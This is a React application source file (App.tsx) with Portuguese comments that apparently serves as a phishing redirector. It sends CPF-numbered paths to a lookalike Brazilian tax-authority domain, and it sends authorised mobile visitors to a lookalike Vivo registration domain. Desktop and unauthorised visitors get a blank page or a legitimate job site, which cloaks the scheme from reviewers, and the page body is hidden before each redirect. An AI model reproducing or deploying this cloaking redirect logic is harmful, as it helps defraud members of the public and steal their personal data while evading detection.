import { Switch, Route, Redirect } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/not-found";
import Dashboard from "@/pages/Dashboard";
import Redirector from "@/pages/Redirector";

function Router() {
  // Verificar se é uma rota com CPF (ex: /06537080177)
  const currentPath = window.location.pathname;
  const cpfMatch = currentPath.match(/^\/(\d{11})$/);
  
  if (cpfMatch) {
    // Se encontrou CPF na slug, redirecionar para o site da Receita
    const cpf = cpfMatch[1];
    const receitaUrl = `https://receita.canalgovbr.org/${cpf}`;
    
    // Esconder página e redirecionar
    document.body.style.display = 'none';
    window.location.href = receitaUrl;
    
    return null;
  }
  
  // Na rota principal, verificamos se tem o parâmetro dashboard
  // Se não tiver, redirecionamos instantaneamente
  if (currentPath === '/' && !window.location.search.includes('dashboard=true')) {
    const Instant = () => {
      // Lógica de redirecionamento direto (fixo) 
      const isAuthorized = new URLSearchParams(window.location.search).get('acesso') === 'autorizado';
      
      // Verificar se é dispositivo móvel
      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      
      // Esconder completamente a página
      document.body.style.display = 'none';
      document.body.style.opacity = '0';
      document.documentElement.style.backgroundColor = 'transparent';
      
      // Determinar destino baseado em autorização e tipo de dispositivo
      let redirectUrl = 'https://atendimentovivo.gupy.io'; // Domínio padrão para não-autorizado
      
      if (isAuthorized) {
        // Se tem parâmetro de autorização
        if (isMobile) {
          // Dispositivo móvel - redireciona para o domínio correto
          redirectUrl = 'https://portal.vivo-cadastro.com?acesso=autorizado';
        } else {
          // Desktop - redireciona para about:blank
          redirectUrl = 'about:blank';
        }
      }
      
      // Redirecionar imediatamente
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 50);
      
      return null;
    };
    
    return (
      <Switch>
        <Route path="/" component={Instant} />
        <Route path="/dashboard" component={Dashboard} />
        <Route component={NotFound} />
      </Switch>
    );
  }
  
  return (
    <Switch>
      <Route path="/" component={Redirector} />
      <Route path="/dashboard" component={Dashboard} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Router />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
